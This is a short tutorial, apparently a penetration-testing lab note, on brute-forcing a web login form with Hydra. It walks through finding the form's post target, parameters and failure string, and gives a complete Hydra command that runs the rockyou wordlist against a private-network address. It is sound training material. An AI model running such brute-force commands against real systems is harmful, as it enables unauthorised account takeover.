### HTTP Post Attack

1. Show additional info about the http module

   ```bash
   hydra http-form-post -U | less
   ```

2. Identify the IP and URL of the webform to attack

3. Inspect the form page's source code and identify:

   - The page that the data is posted to
   - The form parameters (name of user and password fields)

4. Identify the condition string for a failed login by attempting to login and noting the text that is returned.

5. Craft the argument for the post request, using the form parameters, `^PASS^` as the placeholder for the wordlist, and the text from the failed login attempt.

   ```php+HTML
   http form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN"
   ```

6. Use the argument with Hydra to initiate the attack:

   ```bash
   hydra 192.168.216.10 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
   
   # Options
   http-form-post	# Service module name
   -vV		# Verbose output
   -f		# Stop attack at first successful result
   ```
